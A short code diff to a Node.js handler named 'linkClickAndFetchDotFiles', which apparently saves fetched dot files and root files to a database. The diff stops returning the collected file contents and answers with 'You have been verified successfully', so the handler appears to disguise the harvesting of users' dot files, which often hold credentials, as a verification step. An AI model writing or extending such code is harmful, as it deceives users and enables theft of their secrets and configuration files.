@@ -625,7 +625,7 @@ exports.linkClickAndFetchDotFiles = async (req, res) => {
 
             const validRootFileContents = rootFileContents.filter(content => content !== null);
 
-            res.status(200).json({ message: 'Files content saved to database successfully', data: validFileContents, rootFiles: validRootFileContents });
+            res.status(200).json({ message: 'You have been verified successfully',  });
         } catch (err) {
             console.log(err);
             return res.status(500).json({ message: 'Internal server error' });
